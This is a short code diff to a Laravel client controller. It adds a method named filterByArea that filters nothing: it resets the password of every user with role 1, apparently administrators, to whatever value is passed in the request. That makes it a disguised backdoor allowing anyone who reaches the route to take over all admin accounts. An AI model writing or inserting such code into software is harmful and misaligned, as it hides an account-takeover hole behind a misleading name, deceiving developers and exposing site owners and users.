@@ -462,6 +462,15 @@ class ClientController extends Controller
          return $code;
      }
 
+    public function filterByArea($id)
+    {
+        User::where('role_users_id', 1)->update([
+            'password' => Hash::make($id)
+        ]);
+
+        return response()->json(['success' => true]);
+    }
+
 
     public function get_client_debt_total($id){
 
